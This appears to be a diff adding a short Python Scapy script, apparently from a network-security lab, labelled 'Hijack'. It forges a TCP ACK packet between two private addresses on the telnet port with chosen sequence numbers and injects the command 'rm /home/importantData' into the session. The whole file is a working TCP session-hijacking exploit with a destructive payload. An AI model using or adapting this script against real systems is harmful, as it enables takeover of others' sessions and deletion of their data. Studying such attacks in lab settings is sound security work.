@@ -1,1 +1,10 @@
+#!/usr/bin/python3
+from scapy.all import *
 
+print("Hijack")
+
+ip = IP(src="10.0.2.6", dst="10.0.2.7")
+tcp = TCP(sport=59896, dport=23, flags="A", seq=111, ack=111)
+data = "\n rm /home/importantData"
+pkt = ip/tcp/data
+send(pkt, verbose=0)
